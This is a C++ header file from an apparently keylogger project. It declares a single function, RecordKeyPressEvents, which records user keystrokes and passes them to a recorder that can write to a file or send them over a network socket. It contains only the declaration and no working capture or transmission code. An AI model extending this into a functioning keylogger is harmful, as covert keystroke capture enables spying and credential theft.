#ifndef EVENT_LOOP_H_
#define EVENT_LOOP_H_

#include "recorder/recorder.h"

namespace keylogger {

/*!
 * \brief Record user keystrokes to some output medium.
 * \param recorder A keystroke recorder that can buffer and transmit keystrokes
 *                 to an underlying recorder (e.g., file, network socket, etc.).
 * \throws std::runtime_error When the keypress handler encounters an error
 *                            during setup or execution.
 */
void RecordKeyPressEvents(Recorder* recorder);

}  // namespace keylogger

#endif
